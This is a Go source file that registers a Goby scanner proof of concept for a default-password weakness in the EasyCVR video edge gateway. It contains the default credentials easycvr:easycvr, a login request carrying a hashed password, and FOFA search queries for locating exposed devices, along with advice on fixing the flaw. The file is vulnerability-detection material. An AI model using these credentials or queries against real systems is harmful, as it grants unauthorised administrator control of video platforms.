package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Description": "<p>EasyCVR intelligent edge gateway is a software and hardware integrated product of TSINGSEE Qingxi Video, which can provide multi-protocol (RTSP/RTMP/GB28181/Hikang Ehome/Dahua, Haikang SDK, etc.) equipment video access, acquisition, AI Intelligent detection, processing, distribution and other services.</p><p>Attackers can control the entire platform through default password vulnerabilities and use administrator privileges to operate core functions.</p>",
    "Product": "EasyCVR",
    "Homepage": "http://www.tsingsee.com/product/easycvr/",
    "DisclosureDate": "2021-12-01",
    "Author": "learnupup@gmail.com",
    "FofaQuery": " body=\"EasyGBS\" || body=\"EasyDarwin.Body\" || body=\"EasyCVR\"",
    "GobyQuery": " body=\"EasyGBS\" || body=\"EasyDarwin.Body\" || body=\"EasyCVR\"",
    "Level": "2",
    "Impact": "<p>attackers can control the entire platform through default password vulnerabilities and use administrator privileges to operate core functions.</p>",
    "Recommendation": "<p> </p><p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers, and special characters, with more than 8 digits.</p><p>2. If not necessary, prohibit public network access to the system.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
    "Translation": {
        "CN": {
            "Name": "EasyCVR 智能边缘网关 source/api/v1/login 文件默认口令漏洞",
            "Product": "EasyCVR智能边缘网关",
            "Description": "<p>EasyCVR智能边缘网关是TSINGSEE青犀视频旗下软硬一体的一款产品，可提供多协议（RTSP/RTMP/GB28181/海康Ehome/大华、海康SDK等）的设备视频接入、采集、AI智能检测、处理、分发等服务。</p><p>攻击者可通过默认口令&nbsp;easycvr:easycvr 控制整个平台，使用管理员权限操作核心的功能。<br></p>",
            "Recommendation": "<p>1、修改默认口令，密码最好包含大小写字母、数字和特殊字符等，且位数大于8位。<br></p><p>2、如非必要，禁止公网访问该系统。</p><p>3、通过防火墙等安全设备设置访问策略，设置白名单访问。</p>",
            "Impact": "<p>攻击者可通过默认口令&nbsp;easycvr:easycvr 控制整个平台，使用管理员权限操作核心的功能。<br><br></p>",
            "VulType": [
                "默认口令"
            ],
            "Tags": [
                "默认口令"
            ]
        },
        "EN": {
            "Name": "EasyCVR intelligent edge gateway source/api/v1/login file default password vulnerability",
            "Product": "EasyCVR",
            "Description": "<p>EasyCVR intelligent edge gateway is a software and hardware integrated product of TSINGSEE Qingxi Video, which can provide multi-protocol (RTSP/RTMP/GB28181/Hikang Ehome/Dahua, Haikang SDK, etc.) equipment video access, acquisition, AI Intelligent detection, processing, distribution and other services.</p><p>Attackers can control the entire platform through default password vulnerabilities and use administrator privileges to operate core functions.</p>",
            "Recommendation": "<p> </p><p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers, and special characters, with more than 8 digits.</p><p>2. If not necessary, prohibit public network access to the system.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
            "Impact": "<p>attackers can control the entire platform through default password vulnerabilities and use administrator privileges to operate core functions.<br></p>",
            "VulType": [
                "Default Password"
            ],
            "Tags": [
                "Default Password"
            ]
        }
    },
    "References": [],
    "Is0day": false,
    "HasExp": false,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/api/v1/login?username=easycvr&password=5cdecdb8e87a0db1fe6e35555a870ae5",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "Success OK",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "EasyDarwin",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "keymemo|define|variable|easycvr:easycvr",
                "vulurl|define|variable|{{{scheme}}}://easycvr:easycvr@{{{hostinfo}}}/api/v1/login"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Default Password"
    ],
    "VulType": [
        "Default Password"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "8.6",
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Name": "EasyCVR intelligent edge gateway source/api/v1/login file default password vulnerability",
    "PocId": "10802"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}